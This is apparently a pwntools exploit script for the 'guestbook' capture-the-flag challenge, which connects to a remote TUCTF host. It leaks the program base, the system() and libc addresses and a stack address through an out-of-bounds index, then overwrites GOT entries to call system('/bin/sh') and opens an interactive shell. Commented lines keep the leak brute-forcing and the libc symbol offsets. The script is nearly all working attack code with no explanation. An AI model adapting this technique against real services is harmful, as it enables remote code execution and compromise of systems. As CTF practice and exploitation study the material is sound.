from pwn import *

#context.log_level = "debug"
#conn = process("./guestbook")#, env={"LD_PRELOAD":"./libc.so.6"})
HOST = "guestbook.tuctf.com"
PORT = 4545
conn = remote(HOST, PORT)
conn.sendlineafter(">>>", "A" * 0x7)
conn.sendlineafter(">>>", "B" * 0x7)
conn.sendlineafter(">>>", "C" * 0x7)
conn.sendlineafter(">>>", "/bin/sh")
#i = 0
#forbid = [4,8,9,10,11,13,15,16,17,18,22,25,26,27,28,29,30,31,33,37,39,42,49]
#while True:
#    print i 
#    conn.sendlineafter(">>", "1")
#    conn.sendlineafter(">>>", str(i))
#    leak_str = conn.recvuntil("-")
#    print leak_str.encode("hex")
#    i += 1
#    while i in forbid: i += 1
conn.sendlineafter(">>", "1")
conn.sendlineafter(">>>", str((0x100000000 - 400) // 4))
BINARY = u32(conn.recvline()[:4]) // (0x10 ** 3) * (0x10 ** 3)
log.success("BINARY :0x%x" % BINARY)

conn.sendlineafter(">>", "1")
conn.sendlineafter(">>>", "6")
conn.recvline()
leak_str = conn.recvuntil("\xff")
SYSTEM = u32(leak_str[:4])
log.success("SYSTEM :0x%x" % SYSTEM)
#0003e3e0 W system
LIBC = SYSTEM - 0x3e3e0
log.success("LIBC :0x%x" % LIBC)
STACK = u32(leak_str[4:8])
log.success("STACK :0x%x" % STACK)
#for i in range(100):
#    print i 
#    conn.sendlineafter(">>", "2")
#    conn.sendlineafter(">>>", "3")
#    conn.sendlineafter(">>>", p32(0x0) * i)
#    conn.sendline("")
#    conn.sendlineafter(">>", "1")
#    conn.sendlineafter(">>>", "0")
conn.sendlineafter(">>", "2")
conn.sendlineafter(">>>", "3")
#s reloc.gets_16
#[0x00002010]>
#s reloc.getchar_20
#[0x00002014]> 
#s reloc.strcpy_24
#[0x00002018]> 
#s reloc.malloc_28
#[0x0000201c]> 
#s reloc.puts_32
#[0x00002020]>
conn.sendlineafter(">>>", p32(STACK) + p32(0x0) * 26 + p32(BINARY + 0x2000) + "\n")

conn.sendlineafter(">>", "2")
conn.sendlineafter(">>>", "0")
#0004cc70 T printf
#0006ae60 T getchar
#00079ad0 i strcpy
#00075b80 T malloc
#00064da0 W puts
conn.sendlineafter(">>>", p32(BINARY + 0x540) * 3 + p32(LIBC + 0x4cc70) + p32(SYSTEM) + p32(LIBC + 0x6ae60) + p32(LIBC + 0x79ad0) + p32(LIBC + 0x75b80) + p32(SYSTEM) +"\n")
conn.interactive()
